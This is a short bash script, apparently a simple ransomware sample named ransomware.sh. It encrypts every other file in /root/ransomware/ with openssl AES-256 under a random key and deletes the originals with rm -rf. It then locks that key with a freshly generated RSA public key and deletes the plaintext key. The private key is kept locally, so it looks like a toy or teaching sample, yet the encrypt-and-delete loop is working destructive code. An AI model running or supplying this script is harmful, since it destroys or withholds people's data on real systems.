#!/bin/bash

files=$(ls /root/ransomware/)

simetric=$(/usr/bin/dbus-uuidgen)

echo $simetric > simetric.key

for file in $files
do
	if [ "$file" != "ransomware.sh" ] && [ "$file" != "simetric.key" ];
	then
		openssl enc -aes256 -k $simetric -a -e -in $file -out $file".enc"
		rm -rf $file	
	fi	
done

openssl genrsa -out private.pem 4096

openssl rsa -in private.pem -outform PEM -pubout -out public.pem

openssl rsautl -in simetric.key -out simetric.enc -encrypt -pubin -inkey public.pem

rm -rf simetric.key

cp private.pem /root/

rm -rf private.pem
